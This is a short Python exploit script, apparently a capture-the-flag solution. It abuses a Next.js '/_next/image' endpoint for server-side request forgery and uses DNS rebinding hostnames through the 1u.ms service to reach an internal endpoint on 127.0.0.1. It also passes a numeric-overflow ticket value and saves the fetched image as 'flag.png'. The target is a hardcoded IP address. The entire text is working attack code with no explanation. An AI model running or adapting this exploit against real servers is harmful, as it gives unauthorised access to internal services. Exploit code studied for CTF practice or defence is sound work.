import requests
from urllib.parse import urlparse

def solution(url: str) -> None:
    pass_ip = urlparse(url).hostname
    target_ip = "127.0.0.1"
    with requests.Session() as ses:
        for i in range(1, 101):
            rebind_host = f"try{i}-make-{pass_ip}-rebind-{target_ip}-rr.1u.ms"
            inner_url = f"http://{rebind_host}:5000/internal/get-image?ticket_no=1e309"
            data = ses.get(f"{url}/_next/image?url={inner_url}&w=1920&q=75").content
            if data.startswith(b"\x89PNG"):
                with open("flag.png", "wb") as f:
                    f.write(data)
                break

if __name__ == "__main__":
    url = "http://13.125.67.227:3000"
    solution(url)
    